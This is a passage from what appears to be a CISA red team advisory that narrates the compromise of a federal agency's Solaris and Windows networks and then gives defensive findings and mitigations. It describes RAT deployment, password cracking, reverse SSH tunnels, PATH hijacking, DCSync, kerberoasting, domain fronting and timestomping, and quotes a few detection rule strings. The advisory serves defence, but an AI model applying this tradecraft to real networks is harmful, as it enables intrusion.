<p>The exploit provided code execution on a backend application server (SERVER 1) that handled incoming requests from the public-facing web server. The red team used this exploit to upload and run a secure Python remote access tool (RAT). Because the application server had full external internet egress via Transmission Control Protocol (TCP) ports <code>80</code> and <code>443</code>, the RAT enabled consistent command and control (C2) traffic [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>].</p>
<p><strong>Note:</strong> After gaining access, the team promptly informed the organization’s trusted agents of the unpatched device, but the organization took over two weeks to apply the available patch. Additionally, the organization did not perform a thorough investigation of the affected servers, which would have turned up IOCs and should have led to a full incident response. About two weeks after the team obtained access, exploit code was released publicly into a popular open source exploitation framework. CISA identified that the vulnerability was exploited by an unknown third party. CISA added this CVE to its&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities Catalog</a> on Feb. 2, 2023.</p>
<h5><em>Credential Access, Command and Control, and Privilege Escalation</em></h5>
<p>Once on SERVER 1, the red team probed the host’s files and folder structure [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1005/\" title=\"Data from Local System\">T1005</a>] and identified several old and globally accessible <code>.tar</code> backup files, which included a readable copy of an <code>/etc/shadow</code> file containing the hash for a privileged service account (ACCOUNT 1). The team quickly cracked the account’s weak password using a common wordlist [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/002/\" title=\"Brute Force: Password Cracking\">T1110.002</a>]. They then established an outbound Secure Shell Protocol (SSH) connection over TCP port <code>80</code> and used a reverse tunnel to SSH back into SERVER 1, where they were prompted to reset ACCOUNT 1’s expired password [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1571/\" title=\"Non-Standard Port\">T1571</a>] (see Figure 2). The team identified the account was enabled on a subset of containers, but it had not been actively used in a significant amount of time; the team changed this account’s password to a strong password.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%202%20-%20Exploitation%20of%20the%20Solaris%20Enclave.jpg?itok=zdaEEFmf\" width=\"1024\" height=\"597\" alt=\"Figure 2: Exploitation of the Solaris Enclave\">


</div>
  </figure>
<h6>Figure&nbsp;2: Exploitation of the Solaris Enclave</h6>
<p>The team discovered ACCOUNT 1 was a local administrator with <code>sudo/root</code>&nbsp;access and used it to move laterally (see the next section).</p>
<h5><em>Lateral Movement and Persistence</em></h5>
<p>Servers in the Solaris enclave did not use centralized authentication but had a mostly uniform set of local accounts and permissions [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a>]. This allowed the red team to use ACCOUNT 1 to move through much of the network segment via SSH [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/004/\" title=\"Remote Services: SSH\">T1021.004</a>].</p>
<p>Some servers allowed external internet access and the team deployed RATs on a few of these hosts for C2. They deployed several different RATs to diversify network traffic signatures and obfuscate the on-disk and in-memory footprints. These tools communicated to a red team redirector over TCP/<code>443</code>, through valid HTTPS messages, and over SSH through non-standard ports (<code>80</code> and <code>443</code>) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1571/\" title=\"Non-Standard Port\">T1571</a>]. Much of the traffic was not blocked by a firewall, and the organization lacked application layer firewalls capable of detecting protocol mismatches on common ports.&nbsp;</p>
<p>The team then moved laterally to multiple servers, including high value assets, that did not allow internet access. Using reverse SSH tunnels, the team moved into the environment and used a SOCKS proxy [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>] to progress forward through the network. They configured implants with TCP bind listeners bound to random high ports to connect directly with some of these hosts without creating new SSH login events (see Figure 3).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%203%20-%20Example%20of%20Lateral%20Movement%20in%20the%20Solaris%20Enclave.jpg?itok=5lQGbEQE\" width=\"1024\" height=\"430\" alt=\"Figure 3: Example of Lateral Movement in the Solaris Enclave\">


</div>
  </figure>
<h6>Figure 3: Example of Lateral Movement in the Solaris Enclave</h6>
<p>Once on other internal hosts, the team data mined each for sensitive information and credentials. They obtained personally identifiable information (PII), shadow files, a crackable pass-phrase protected administrator SSH key, and a plaintext password [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1552/003/\" title=\"Unsecured Credentials: Bash History\">T1552.003</a>] in a user’s <code>.bash_history</code>. These data mined credentials provided further avenues for unprivileged access through the network. The team also used SSH tunnels to remotely mount Network File System (NFS) file shares, spoofing <code>uid</code>&nbsp;and <code>gid</code>&nbsp;values to access all files and folders.</p>
<p>To protect against reboots or other disruptions, the team primarily persisted on hosts using the <code>cron</code>&nbsp;utility [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/003/\" title=\"Scheduled Task/Job: Cron\">T1053.003</a>], as well as the <code>at</code> utility [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/002/\" title=\"Scheduled Task/Job: At\">T1053.002</a>], to run scheduled tasks and blend into the environment. Additionally, SSH private keys provided persistent access to internal pivot hosts and would have continued to enable access even if passwords were rotated.</p>
<h5><em>Full Enclave Compromise</em></h5>
<p>Although ACCOUNT 1 allowed the team to move laterally to much of the Solaris enclave, the account did not provide privileged access to all hosts in the network because a subset of hosts had changed the password (which denied privileged access via that account). However, the team analyzed recent user logins using the <code>last</code> command and identified a network security appliance scanning service account (ACCOUNT 2) that logged in regularly to an internal host using password-based authentication. As part of its periodic vulnerability scanning, ACCOUNT 2 would connect to each host via SSH and run <code>sudo</code> with a relative path instead of the absolute path <code>/usr/local/bin/sudo</code>. The local path created a path hijack vulnerability, which allowed the red team to hijack the execution flow and capture the account’s password [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1574/007/\" title=\"Hijack Execution Flow: Path Interception by PATH Environment Variable\">T1574.007</a>].</p>
<p>The harvested password granted unrestricted privileged access to the entire Solaris enclave.</p>
<h5><em>Exploitation of the Windows Domain</em></h5>
<p>While the compromise of the Solaris enclave facilitated months of persistent access to sensitive systems, including web applications and databases, it did not lead to the immediate compromise of the corporate Windows environment. Once in the Windows domain, the red team identified several service accounts with weak passwords. It is likely that an adversary could have continued the Solaris attack path through prolonged password spraying attacks, or by leveraging credentials obtained externally (e.g., dark web credential dumps) (see Figure 4).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%204%20-%20Exploitation%20of%20Solaris%20Enclave.jpg?itok=DQzHfaVi\" width=\"1024\" height=\"498\" alt=\"Figure 4: Exploitation of Solaris Enclave\">


</div>
  </figure>
<h6>Figure 4: Exploitation of Solaris enclave</h6>
<p>The team exploited the Windows domain through other access vectors and eventually proved the undetected pivot between the domains could be made after they obtained Windows credentials.</p>
<h5><em>Reconnaissance and Initial Access</em></h5>
<p>While attempting to pivot into Windows from Solaris, the red team conducted open source information gathering about the organization. They harvested employee names [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1589/003/\" title=\"Gather Victim Identity Information: Employee Names\">T1589.003</a>] and used the information to derive email addresses based on the target’s email naming scheme. After identifying names, emails, and job titles, the team selected several phishing targets who regularly interacted with the public [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1591/004/\" title=\"Gather Victim Org Information: Identify Roles\">T1591.004</a>]. One user triggered a phishing payload that provided initial access to a workstation.</p>
<p>The team then placed a simple initial access RAT on the workstation in a user-writable folder and obtained user-level persistence through an added registry run key, which called back to a red team redirector via HTTPS. The team assessed what was running on the host in terms of antivirus (AV) and Endpoint Detection and Response (EDR) and used the implant to inject a more capable, full-fledged RAT directly into memory, which pointed to a separate redirector. The assessed organization’s tools failed to categorize C2 traffic as anomalous even when a bug in one of the implants caused 8 GB of continuous network traffic to flow in one afternoon.</p>
<h5><em>Credentialed Access and Privilege Escalation</em></h5>
<p>Internal network information was freely available to unprivileged, domain-joined users, and the team queried hundreds of megabytes of Active Directory (AD) data using a custom rewrite of <code>dsquery.exe</code> in <code>.NET</code> and Beacon Object File (BOF) <code>ldapsearch</code> from the phished user’s workstation. The team then data mined numerous internal file servers for accessible shares [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a>]. The team found a password file left from a previous employee on an open, administrative IT share, which contained plaintext usernames and passwords for several privileged service accounts. With the harvested Lightweight Directory Access Protocol (LDAP) information, the team identified one of the accounts (ACCOUNT 3) had system center operations manager (SCOM) administrator privileges and domain administrator privileges for the parent domain. They identified another account (ACCOUNT 4) that also had administrative permissions for most servers in the domain. The passwords for both accounts had not been updated in over eight years and were not enrolled in the organization’s identity management (IDM).</p>
<h5><em>Lateral Movement and Persistence</em></h5>
<p>The team used valid accounts and/or tokens with varied techniques for lateral movement. Techniques included scheduled task manipulation, service creation, and application domain hijacking [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1574/014/\" title=\"Hijack Execution Flow: AppDomainManager\">T1574.014</a>]. For credential usage, the implemented IDM in the organization’s network hampered the red team’s ability to pivot as it blocked common credential manipulation techniques like pass-the-hash [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a>] and pass-the-ticket [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/003/\" title=\"Use Alternate Authentication Material: Pass the Ticket\">T1550.003</a>]. The red team found ways to circumvent the IDM, including using plaintext passwords to create genuine network logon sessions [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/003/\" title=\"Access Token Manipulation: Make and Impersonate Token\">T1134.003</a>] for certain accounts not registered with the IDM, as well as impersonating the tokens of currently logged-in users to piggyback off valid sessions [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/001/\" title=\"Access Token Manipulation: Token Impersonation/Theft\">T1134.001</a>].</p>
<p>The red team tailored payloads to blend with the network’s environment and did not reuse IOCs like filenames or file hashes, especially for persisted implants. Remote queries for directory listings, scheduled tasks, services, and running processes provided the information for the red team to masquerade as legitimate activity [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/004/\" title=\"Masquerading: Masquerade Task or Service\">T1036.004</a>].</p>
<p>The team emulated normal network activity by installing HTTPS beaconing agents on workstations where normal users browse the web, establishing internal network pivots with TCP bind and SMB listeners. They primarily relied on creating Windows services as their persistence mechanism.</p>
<p>The red team used the data mined credentials for ACCOUNT 3 to move laterally from the workstation to a SCOM server. Once there, using ACCOUNT 4, the team targeted a Systems Center Configurations Manager (SCCM) server, as it was an advantageous network vantage point. The SCCM server had existing logged-in server administrators whose usernames followed a predictable naming pattern (correlating administrative roles and privilege levels), allowing them to determine which account to use to pivot to other hosts.&nbsp;</p>
<p>The team targeted the organization’s jump servers frequented by highly privileged administrative accounts. Red team operators used stolen SCCM server administrator credentials to compromise one of the organization’s server-administrator jump hosts. They learned that the organization separated some, but not all, accounts onto separate jump servers by role (e.g., workstation administrators and server administrators had separate jump points, but server and domain administrators occasionally shared the same jump hosts). Once a domain administrator logged in, the red team stole the administrator’s session token and laterally moved to a domain controller where they pulled credentials for the entire domain via <code>DCSync</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/006/\" title=\"OS Credential Dumping: DCSync\">T1003.006</a>], obtaining full domain compromise (see Figure 5).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%205%20-%20Exploitation%20of%20the%20Windows%20Domain.jpg?itok=xZHx9Pi4\" width=\"720\" height=\"540\" alt=\"Figure 5: Exploitation of the Windows Domain\">


</div>
  </figure>
<h6><em><strong>Figure&nbsp;5: Exploitation of the Windows Domain</strong></em></h6>
<p>After compromising the domain, the team confirmed access to sensitive servers, including multiple high value assets (HVAs) and tier zero assets. None of the accessed servers had any noticeable additional protections or network access restrictions despite their sensitivity and critical functions in the network. Remote administration and access of these critical systems should be restricted to designated, role-based accounts coming from specific network enclaves and/or workstations. Isolation with these access vector limitations protects them from compromise and sharply reduces the associated noise, allowing defenders to more easily identify abnormal behavior.</p>
<h5><em>Pivoting Into External Trusted Partners</em></h5>
<p>The team inspected the organization’s trust relationships with other organizational domains through LDAP [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a>] and identified connections to multiple external FCEB partner organizations, one of which they subsequently used to move laterally.</p>
<p>The team pulled LDAP information from PARTNER DC 1 and kerberoasted the domain, yielding one valid service account with a weak password they quickly cracked, but the team was unable to move laterally with this account because it lacked appropriate privileges. However, PARTNER 1 had trusted relationships with a second partner’s domain controller (PARTNER DC 2). Using the acquired PARTNER 1 credentials, the red team discovered PARTNER 2 also had a kerberoastable, highly privileged administrative service account whose password cracked, allowing the team to laterally move to a PARTNER 2 host from the original victim network (see Figure 6).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%206%20-%20Path%20of%20Exploitation%20into%20External%20FCEB%20Organizations.jpg?itok=nAIxe-Bo\" width=\"1024\" height=\"486\" alt=\"Figure 6: Path of Exploitation into External FCEB Organizations\">


</div>
  </figure>
<h6>figure 6: path of exploitation into external fceb organizations</h6>
<p>These cross-organizational attack paths are rarely identified or tested in regular assessments or audits due to network ownership, legal agreements, and/or vendor opacity. However, they remain a valuable access vector for advanced persistent threat (APT) actors.</p>
<p>Experimentation with access into trusted partner domains included the modification of local system firewall rules on the source domain controller to allow specific source and destination IPs. The organization’s host-based monitoring systems failed to identify the addition and removal of the red team’s firewall exceptions.</p>
<h5><em>Defense Evasion Techniques</em></h5>
<p><em><strong>Solaris Enclave </strong></em><a><em><strong>Figure&nbsp;</strong></em></a><em><strong>5: Exploitation of the Windows Domain</strong></em></p>
<p>Due to the lack of application allowlisting, the red team regularly masqueraded as legitimate software to remain undetected by the organization’s network defenders [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a>]. Additionally, by default, command auditing in Solaris via the <code>lastcomm</code> command only captures the program being run—full file path and any command line arguments are not recorded. For example:</p>
<ul>
<li>A real file: <code>/opt/splunkforwarder/bin/splunkd</code></li>
<li>A malicious copy:&nbsp;<code>/opt/splunkforwarder/splunkd</code></li>
<li>Command auditing logs: <code>splunkd</code></li>
</ul>
<p>The team also hid common artifacts to obfuscate their operational activity, including modifying file timestamps [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/006/\" title=\"Indicator Removal: Timestomp\">T1070.006</a>]&nbsp;and permissions with the <code>touch</code> and <code>chmod/chown</code> commands [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1222/002/\" title=\"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\">T1222.002</a>] to blend with other files in the environment.</p>
<p><em><strong>Windows Domain</strong></em></p>
<p>The team used a diverse range of accounts, backdoors, and C2 channels with different network footprints to obfuscate activity [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a>].</p>
<p>Diversification of account usage, backdoors, and C2 channels further obfuscated red team activity in the domain. Lateral movement to new hosts featured a variety of accounts to reduce the risk of detection. When harvesting credentials, the team selected several backup accounts for each role (e.g., server admin, workstation admin, domain admin, service accounts) in case the intended account was locked, disabled, or flagged as compromised.</p>
<p>To emphasize the value of tool-agnostic/behavior-based detections, the red team deployed over seven different implants to mimic real-world adversaries’ diverse use of open source, commercial off-the-shelf (COTS), and custom RATs. Each featured different host and network signatures to evade out-of-the-box EDR detections and every implant had unique artifacts both on-disk and in-memory. The team also evaded EDR/AV by using proprietary loaders and beacon object files (BOFs) to make direct API calls and allow self-injection of <code>.NET</code> executables to run additional capabilities.</p>
<p>All the deployed tools had different network C2 channel footprints. Some beaconing agents connected via HTTPS to legitimate domains owned by the red team. Others used domain fronting [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/004/\" title=\"Proxy: Domain Fronting\">T1090.004</a>] to leverage common content delivery network (CDN) functionality. Outbound traffic sent to public websites not owned by the red team had a <code>Host</code>&nbsp;header that told the CDN provider it should redirect traffic to red-team-controlled IP addresses. Internal pivots used SMB on port <code>445</code> and TCP bind listeners on ephemeral high ports. The team tailored both to mimic named pipes and network connections already seen in the domain and evade detection.</p>
<h4><strong>Collaborative Phase</strong></h4>
<p>Five months into the assessment, the red team officially notified the organization’s security operations center (SOC) of the ongoing activity and began engaging directly with SOC leadership. At this point, the organization had not submitted deconflictions and did not appear to be actively investigating CISA SILENTSHIELD assessment activity.</p>
<p>During this phase, CISA refrained from providing TTPs or IOCs (such as concrete hosts, filenames, or C2 domains) to allow the organization to develop and test its own detection metrics. The team held weekly discussions with the organization’s senior technical staff, SOC, and system administrators, which led to measurable improvements in response times for known techniques and behavior-based detections that uncovered previously unknown tradecraft. Specifically, the red team worked with the organization to assist them with synthesizing the following data sources to identify the extent of the red team’s compromise:</p>
<ul>
<li>EDR alerts;</li>
<li>YARA scans;</li>
<li>C2 domains and techniques;</li>
<li>Internal pivot hosts;</li>
<li>Admin accounts used to pivot;</li>
<li>Memory dumps, revealing attempts to pass credentials; and</li>
<li>Email logs documenting the initial breach via phishing.</li>
</ul>
<p>Every cyber threat actor has a unique set of TTPs. Nevertheless, nearly all adversaries perform the same basic steps:</p>
<ul>
<li>Command execution (initial access and lateral movement);</li>
<li>Establish C2 channels and exfiltrate data;</li>
<li>Establish persistence;</li>
<li>Escalate privileges; and</li>
<li>Use and abuse credentials.</li>
</ul>
<p>All TTPs have corresponding artifacts, but not all IOCs are created equal. Fixating on a hyper-focused set of IOCs can catch known threats but impedes efforts to identify unknown adversaries employing different TTPs.</p>
<p>Major themes discussed during this phase that improved the organization’s behavior-based detection capabilities included log collection, forensic analysis, relying on IOCs for detection, monitoring and investigation management, and Sysmon misconfigurations.</p>
<h5><em>Log Collection</em></h5>
<p>The assessed organizations had ineffective and insufficient logs, and network defenders were not using logs to proactively detect anomalous behavior. With the red team’s assistance, the organization identified logging issues caused by hardware failures, limited backups, network bandwidth, and limited log collection and retention policies (only 60–90 days). In other cases, critical data was captured but not analyzed because artifacts were moved to cold storage.</p>
<p>The organization’s network defenders identified procedural and other roadblocks when attempting to acquire new forensic data. For example, affected servers could not be taken offline for imaging because there was no process in place to do so without impacting the organization’s operations. Additionally, attempts to capture forensic data via packet captures occurred directly on the compromised Solaris and Windows hosts, where the red team observed the data being collected and therefore had the opportunity to disrupt collection, tamper with evidence files, and better adapt and evade their defenses.</p>
<h5><em>Forensic Analysis</em></h5>
<p>Defenders did not monitor C2 egress via DNS. They believed their parent entity was monitoring their DNS traffic, absolving them of a need to collect and monitor logs for their analyses.</p>
<p>Forensic analysts blindly trusted the timestamps for files and persistence mechanisms without realizing they had been tampered with. Bogus times added to persistence mechanisms (such as scheduled tasks) led defenders to misjudge the timeline of the breach. Red team operators regularly adjusted the last-modified timestamp of files and folders—using either the native<code> touch -r</code> command or implants’ <code>timestomp</code> command to disguise the last-modified timestamp captured in the output of <code>ls –la</code>. Secondary file timestamps identified with <code>ls -lu</code> or <code>ls -lc</code> would have revealed abnormal file attributes, in addition to more reliable anomalies found during proper forensic investigation.</p>
<h5><em>Reliance on Known IOCs</em></h5>
<p>The red team used diversified TTPs in the Adversary Emulation phase to reflect the ability of cyber threat actors to bypass conventional, known-bad detection strategies. The network defenders did not detect much of the team’s activity. For example:</p>
<ul>
<li>After identifying a red team payload, network defenders wrote tailored YARA rules that signatured specific behavior of the red team’s loader, which uncovered several similar payloads but failed to catch any of the other six C2 frameworks.</li>
<li>Organization network defenders used a combination of custom and open source detection rules (such as <code>CommandLine=kerberoast*</code> or files called <code>bloodhound.zip</code>) and did not detect the team’s kerberoasting activity.</li>
</ul>
<h5><em>Regular Monitoring and Investigation Management</em></h5>
<p>Conversations with SOC leadership revealed several procedural issues that led to slow or incomplete analysis of the red team’s intrusion and activity. For example:</p>
<ul>
<li>While EDR products detected and quarantined several of the red team’s tools, including the initial phishing payload, the organization’s daily procedures did not always include review of EDR alerts. The red team worked with the organization to ensure rapid response to EDR alerts became a fundamental part of network defenders’ daily workflows. This allowed SOC personnel to identify new attempts at lateral movement.</li>
<li>Solaris network owners discovered that several firewalls had inadvertently been misconfigured or disabled. The organization’s technical teams worked directly with the red team to fix errors and to reorganize and revalidate the network topology.</li>
<li>Network defenders had poor operational security and alerted the red team of investigations. For example:
<ul>
<li>In one instance, after receiving incoming beacons from what was evidently a sandboxed environment, the payload was not renamed from its original file, allowing the red team to immediately identify how much of their access was under scrutiny. Organizations must ensure sandboxed environments are safe, secure, and thoroughly sandboxed.</li>
<li>The red team observed system administrators reviewing forensic artifacts tied to the team’s Solaris payload—searching for files, running packet captures for outbound C2 traffic, and port scanning the C2 redirector. Team members simply reinstalled their persistence with a new redirector and file path, sidestepping the informal investigation.</li>
</ul>
</li>
<li>IT teams were siloed from the SOC, who had no knowledge of the system administrator’s weeks long investigation into the anomalous network behavior.</li>
<li>While the organization compartmented most of its threat hunting and incident response in a separate domain, staff still used the compromised corporate domain accounts to communicate the details of active investigations and assessments.</li>
</ul>
<h5><em>Sysmon Misconfigurations</em></h5>
<p>The red team had a productive exchange with the organization on their Sysmon configuration, which the team abused throughout the assessment. The red team identified several misconfigurations:</p>
<ul>
<li>Deployment teams pushed the ruleset (stored as a <code>.xml</code> file) to a globally readable <code>C:\\Windows</code> directory. There were no rules in place to catch adversaries reading the configurations from disk or the registry. As a result, CISA’s red team was provided explicit file paths to safely place their payloads.</li>
<li>Rules targeted a single, tool-specific IOC rather than a technique (e.g., <code>sc.exe</code> rather than service creation events).</li>
<li>Exceptions were overly permissive (for example, excluding all Image entries anywhere in <code>C:\\Program Files (x86)\\Google\\Update\\*</code>).</li>
</ul>
<h3>LESSONS LEARNED AND KEY FINDINGS</h3>
<p>The red team noted the following lessons learned and key findings relevant to the security of the assessed organization’s network. These specific findings contributed to the team’s ability to gain persistent access across the organization’s network. See the Mitigations section for recommendations on how to address these findings.</p>
<h4>Lesson Learned: The assessed organization had insufficient controls to prevent and detect malicious activity.</h4>
<ul>
<li><strong>Finding #1: The organization’s perimeter network was not adequately firewalled from its internal network, which failed to restrict outbound traffic.</strong> A majority of the organization’s hosts, including domain controllers, had internet connectivity to broad AWS EC2 ranges, allowing the red team to make outbound web requests without triggering IDS/IPS responses. These successful connections revealed the lack of an application layer firewall capable of detecting protocol mismatches on common ports.</li>
<li><strong>Finding #2: The assessed organization had insufficient network segmentation</strong><em><strong>.</strong>&nbsp;</em>The lack of network segmentation allowed the red team to move into, within, and out of both the Solaris and Windows domain. This also enabled them to gather a massive amount of data about the organization and its systems. Internal servers could reach almost any other domain host, regardless of type (server vs. workstation), purpose (user laptop, file server, IDM server, etc.), or physical location. Use of network address translation (NAT) between different parts of the network further obfuscated data streams, hindering incident response.</li>
<li><strong>Finding #3: The organization had trust relationships with multiple partner organizations,&nbsp;</strong>which—when combined with weak credentials and network connectivity—allowed the red team to exploit and move laterally to a partner domain controller. This highlights the risk of blindly allowing third party network connectivity and the importance of regularly monitoring both privileged access and transitive trusted credential material<strong>.</strong></li>
<li><strong>Finding #4: The organization’s defensive staff did not sufficiently isolate their defensive investigative activity.</strong> Organizations should always communicate information pertaining to suspected incidents out-of-band, rather than from within a domain that they know to be compromised. While the defensive systems were shunted to another domain with correct (one-way) trusts, the red team identified a likely attack vector to that domain via the same, previously compromised IDM server. Some analysts also performed dynamic analysis of suspected implants from an internet-connected sandbox, tipping the red team to the specific files and hosts that were under investigation.</li>
<li><strong>Finding #5: Network defenders were not familiar with the intricacies of their IDM solution.</strong> The CISA red team identified accounts not enrolled in the IDM and successfully used those and already existing user access tokens to bypass IDM. The appliance, in its active configuration, was not exhaustively tested against common credential manipulation techniques nor were any alerts on anomalous behavior being monitored.</li>
<li><strong>Finding #6: The organization had some role-based host segmentation, but it was not granular enough.</strong> The organization used clearly defined roles (server administrator and domain administrator) but did not sufficiently segregate the accounts to their own servers or systems, enabling privilege escalation.</li>
</ul>
<h4>Lesson Learned: The organization did not effectively or efficiently collect, retain, and analyze logs.</h4>
<ul>
<li><strong>Finding #7</strong>: <strong>Defensive analysts did not have the information they needed</strong> due to a combination of issues with collecting, storing, and processing logs. Other policies collected too much useless data, generating noise and slowing investigation.</li>
<li><strong>Finding #8: Network defenders’ daily procedures did not always include analysis of EDR alerts</strong>, and the tools that were installed only provided a 30-day retention for quarantined files. Consequently, investigators were unable to access timely information that may have led to earlier detection of the red team’s activity.</li>
<li><strong>Finding #9: Forensic analysts trusted host artifacts that could have been modified by an adversary.&nbsp;</strong>In particular, file timestamps and packet captures were scrutinized without considering the possibility of malicious tampering.</li>
</ul>
<h4>Lesson Learned: Bureaucratic communication and decentralized teams hindered the organization’s network defenders.</h4>
<ul>
<li><strong>Finding #10: The organization’s technical staff were spread across decentralized teams.</strong> Siloed team structure meant that IT, security, and other technical teams lacked consistency with their tools, creating too much noise for defenders to sift through.</li>
<li><strong>Finding #11: The SOC team lacked the agency to rapidly update or deploy rulesets through the fractured IT teams</strong>. The organization diffused responsibility for individual tools, such as Sysmon, across multiple groups, hampering timeliness and maintenance of a defensive posture.</li>
<li><strong>Finding #12</strong>: <strong>The organization’s forensics team produced an incident response report which documented the red team’s initial exploitation of the Solaris enclave. However, the report was limited in scope and did not adequately document the red team’s ability to expand and persist</strong>.&nbsp;The success of the red team’s first phase, using publicly known TTPs, illustrated the business risk to all Solaris hosts and, by extension, the Windows environment. Moreover, the organization’s internal report only focused on vulnerable servers and did not account for a cyber threat actor’s ability to expand and persist in the Solaris enclave.
<ul>
<li>The Solaris administrator’s investigations of the red team failed to appear in either the report or in SOC deconflictions. An admin’s inquiry into unusual and probably malicious activity, particularly in the middle of an investigation of confirmed breaches of adjacent hosts, should have been considered in the report as evidence of lateral movement.</li>
</ul>
</li>
</ul>
<h4>Lesson Learned: A “known-bad” detection approach hampered detection of alternate TTPs.</h4>
<ul>
<li><strong>Finding #13</strong>: <strong>Defenders hyper-focused on specific IOCs, such as file attributes, particular C2 frameworks, or C2 domains.&nbsp;</strong>The organization’s network defenders did not initially employ tool-agnostic detections, causing them to positively identify some red team tools, but remain blind to the full extent of the compromise. They were accustomed to catching internal red teams that used specific TTPs; introducing a new “threat actor” with new TTPs sidestepped nearly all detections.</li>
<li><strong>Finding #14</strong>: <strong>Detection rules were visible from compromised systems</strong>, allowing the red team to sidestep detections based on hardcoded rules and exceptions.</li>
<li><strong>Finding #15: There was insufficient restriction of administrative tools.</strong> The technical staff lacked a standardized set of administrative tools, leaving all remote administration protocols available for use by admins, CISA red team, or adversaries. This also created excessive noise for defenders to effectively sift through to determine expected versus anomalous activity.</li>
<li><strong>Finding #16: There was insufficient tracking of software</strong>. There was no apparent approval or tracking process for software installation across the domain, preventing defensive analysts from identifying abnormal software placed by the red team. A comprehensive inventory of approved software would help defenders identify abnormal behavior and facilitate the deployment of application allow-listing.</li>
</ul>
<h3>NOTED STRENGTHS</h3>
<p>The assessed organization promptly planned for and resolved multiple identified issues, including with:</p>
<ul>
<li><strong>Windows service accounts</strong>: The organization eliminated over 30 percent of service accounts which were deemed unnecessary. There is an on-going effort to change service account passwords and apply DoD recommended STIG compliance (over 85 percent have been changed since the publication of this report).</li>
<li><strong>IDM</strong>: The organization is looking into how to improve their IDM implementation and apply additional security alerts and preventions for possible misuse of credentials. They plan to implement additional identity-based monitoring capabilities in front of tier zero assets.</li>
<li><strong>Egress</strong>: The organization implemented new processes to detect and prevent servers from anomalously egressing outside of the network to the internet.</li>
<li><strong>Host-based solutions</strong>: The organization used additional features of their antivirus software, such as reputation scores, to look for all executable file type outliers of to identify anomalous instances.</li>
<li><strong>Hosts</strong>: The organization decommissioned clusters of servers and completely rebuilt them from scratch after identifying numerous irreparable issues and misconfigurations.</li>
<li><strong>Solaris credentials</strong>: The organization changed passwords, removed SSH keys, restricted permissions, and removed unnecessary accounts.</li>
</ul>
<h3>MITIGATIONS</h3>
<h4><strong>Network Defenders</strong></h4>
<p>CISA recommends organizations implement the recommendations in Table 1 to mitigate the findings listed in the Lessons Learned and Key Findings section of this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. See CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Recommendations to Mitigate Identified Issues</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Finding</strong></th>
<th role=\"columnheader\"><strong>Recommendation</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Inadequate firewall between perimeter and internal devices</td>
<td>
<ul>
<li>Deploy internal and external network firewalls to inspect, log, and/or block unknown or unauthorized traffic.</li>
<li>Perform deep packet inspection to detect mismatched application traffic or encrypted data flows.</li>
<li>Restrict outbound internet egress to hosts whenever possible.</li>
<li>Establish a baseline of normal user activity, including unique IPs or domains.</li>
